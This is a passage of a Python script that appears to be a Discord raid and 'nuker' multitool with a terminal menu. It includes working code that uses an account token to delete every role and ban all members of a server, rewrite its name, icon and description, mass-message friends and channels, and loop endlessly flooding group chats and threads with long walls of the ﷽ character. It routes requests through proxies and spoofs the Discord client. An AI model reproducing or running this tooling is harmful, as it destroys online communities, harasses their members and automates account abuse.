                    print(f'Role {role["name"]} deleted.')
                except Exception as e:
                    print(f'Failed to delete role {role["name"]}: {e}')
    else:
        print('Failed to retrieve roles:', response.json())

def ban_members(guild_id, token):
    # Headers for authorization
    HEADERS = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }
    # Get all members
    proxy = get_proxies().pop()
    response = requests.get(f'{BASE_URL}/guilds/{guild_id}/members', headers=HEADERS, proxies={"http": proxy})
    if response.status_code == 200:
        members = response.json()
        for member in members:
            if member['user']['id'] != guild_id:  # Do not ban server owner
                try:
                    user_id = member['user']['id']
                    # Ban member
                    proxy = get_proxies().pop()
                    requests.put(f'{BASE_URL}/guilds/{guild_id}/bans/{user_id}', headers=HEADERS, proxies={"http": proxy})
                    print(f'{member["user"]["username"]} banned.')
                except Exception as e:
                    print(f'Failed to ban {member["user"]["username"]}: {e}')
    else:
        print('Failed to retrieve members:', response.json())

def get_picture_by_url(IMAGE_URL):
    # Получаем изображение по URL
    response = requests.get(IMAGE_URL)
    if response.status_code != 200:
        print(f'Failed to fetch image: {response.status_code} - {response.text}')
    return response.content

def change_logo_guild(image_data, TOKEN, GUILD_ID):
    base64_image = base64.b64encode(image_data).decode('utf-8')
    headers = {
        'Authorization': TOKEN,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    url = f'https://discord.com/api/v9/guilds/{GUILD_ID}'

    # Формируем данные для PATCH-запроса
    json_data = {
        'icon': f'data:image/png;base64,{base64_image}'
    }

    # Отправляем PATCH-запрос для изменения аватарки
    response = requests.patch(
        url,
        headers=headers,
        json=json_data
    )
    if response.status_code == 200:
        print('Server icon changed successfully.')
    else:
        print(f'Failed to change server icon: {response.status_code} - {response.text}')

def change_description(description, TOKEN, GUILD_ID):
    headers = {
        'Authorization': TOKEN,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    url = f'https://discord.com/api/v9/guilds/{GUILD_ID}'

    # Формируем данные для PATCH-запроса
    json_data = {
        'description': description
    }

    # Отправляем PATCH-запрос для изменения аватарки
    response = requests.patch(
        url,
        headers=headers,
        json=json_data
    )
    if response.status_code == 200:
        print(f'Successfully changed server description to {description}.')
    else:
        print(f'Failed to change server description: {response.status_code} - {response.text}')

def change_server_name(guild_id, new_name, token):
    # Headers for authorization
    HEADERS = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    # Endpoint for updating guild information
    url = f'{BASE_URL}/guilds/{guild_id}'

    # Data to be sent with the request
    data = {
        'name': new_name
    }

    # Send PATCH request to update the server name
    response = requests.patch(url, headers=HEADERS, json=data)

    if response.status_code == 200:
        print(f'Successfully changed server name to "{new_name}".')
    else:
        print(f'Failed to change server name: {response.status_code}, {response.json()}')

def clear():
    os.system("cls" if platform.system() == "Windows" else "clear")

while True:
    clear()
    with open('config.txt', 'r') as f:
        theme = f.read().strip()
    if theme == 'kali':
        setting = f"{Fore.LIGHTGREEN_EX}{username}@kali:{Fore.BLUE}/{folder_name}${Fore.LIGHTGREEN_EX} "
    elif theme == 'windows':
        setting = f"{current_directory}>"
    else:
        setting = f"{Fore.LIGHTGREEN_EX}{username}@kali:{Fore.BLUE}/{folder_name}$ "
    menu()
    choice = input(setting)

    if choice == '1':
        clear()
        token = input(Fore.CYAN + f"Enter your token: ")
        friends = get_friends_list_user(token)
        print(friends)
        input("Press enter to return to the main menu")
    elif choice == '2':
        clear()
        login = input(Fore.CYAN + f"Enter your email: ")
        password = input("Enter your password: ")
        get_token(login, password)
        input("Press enter to return to the main menu")
    elif choice == '3':
        clear()
        token = input(Fore.CYAN + f"Enter your token: ")
        friend_ids = get_friends_list(token)
        message_content = input("What message to send?: ")
        send_message_to_friend(token, message_content, friend_ids)
        input("Press enter to return to the main menu")
    elif choice == '9':
        clear()
        while True:
            clear()
            menu_page_2()
            choice_page_2 = input(setting)
            if choice_page_2 == '1':
                clear()
                token = input(Fore.CYAN + f"Enter your token: ")
                type = input(Fore.CYAN + f"Enter type of custom status (online, idle, dnd, invisible): ")
                text = input(Fore.CYAN + f"Enter text of custom status: ")

                encoded_str = "WicKCAoGb25saW5lEhcKDFRoaW5raW5n8J+klCGAfH9bkAEAABoCCAE="

                replacements = {
                    "online": type,
                    "Thinking": text
                }

                change_custom_status(encoded_str, replacements, token)
                input("Press enter to return to the main menu")
            elif choice_page_2 == '2':
                token = input(Fore.CYAN + f'Enter your token: ')
                boost_count = input(Fore.CYAN + f'Enter boost count: ')
                server_id = input(Fore.CYAN + f'Enter your server id: ')
                url = f'https://discord.com/api/v9/guilds/{server_id}/premium/subscriptions'

                headers = {
                    'Authorization': f'{token}',
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
                }

                payload = {
                    'user_premium_guild_subscription_slot_ids': f'{server_id}'
                }

                for _ in range(int(boost_count)):
                    proxies = get_proxies()
                    proxy_pool = cycle(proxies)
                    proxy = next(proxy_pool)
                    time.sleep(0.5)
                    response = requests.post(url, headers=headers, json=payload, proxies={"http": proxy})

                    if response.status_code == 201:
                        print(f'Server boosted successfully!')
                    else:
                        print(f'Failed to boost server. Status code: {response.status_code}')
                        print(response.text)
                    continue
            elif choice_page_2 == '4':
                token = input(Fore.CYAN + f'Enter your token: ')
                server_id = input(Fore.CYAN + f'Enter your server id: ')
                leaver(token, server_id)
                input("Press enter to return to the main menu")
            elif choice_page_2 == '6':
                token = input(Fore.CYAN + f'Enter your token: ')
                server_id = input(Fore.CYAN + f'Enter your server id: ')
                get_channels_id(server_id, token)
                input("Press enter to return to the main menu")
            elif choice_page_2 == '7':
                token = input(Fore.CYAN + f'Enter your token: ')
                server_id = input(Fore.CYAN + f'Enter your server id: ')
                message_content = input(Fore.CYAN + f'What message to send?: ')
                ids = get_channels_id_sys(server_id, token)
                send_message_to_channel(token, message_content, ids)
                input("Press enter to return to the main menu")
            elif choice_page_2 == '8':
                token = input(Fore.CYAN + f'Enter your token: ')
                server_id = input(Fore.CYAN + f'Enter your server id: ')
                message_content = input(Fore.CYAN + f'What message to send?: ')
                id = input(Fore.CYAN + f"Enter channel id or channels ids: ")
                send_message_to_channel(token, message_content, id)
                input("Press enter to return to the main menu")
            elif choice_page_2 == '9':
                while True:
                    clear()
                    menu_page_3()
                    choice_page_3 = input(setting)
                    if choice_page_3 == "1":
                        token = input(Fore.CYAN + f'Enter your token: ')
                        group_id = input(Fore.CYAN + f'Enter your group id: ')
                        isenabled = True
                        proxies = get_proxies()
                        proxy_pool = cycle(proxies)

                        message = "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"
                        name = "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"
                        while isenabled:
                            proxy = next(proxy_pool)
                            send_message_group(group_id, message, token)
                            change_name_group(group_id, name, token)
                        input("Press enter to return to the main menu")
                    elif choice_page_3 == "2":
                        token = input(Fore.CYAN + f"Enter your token: ")
                        channel_id = input(Fore.CYAN + f"Enter the channel ID: ")
                        message_id = input(Fore.CYAN + f"Enter the message ID: ")
                        thread_name = input(Fore.CYAN + f"Enter the thread name: ")
                        isenabled = True
                        proxies = get_proxies()
                        proxy_pool = cycle(proxies)

                        message = "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽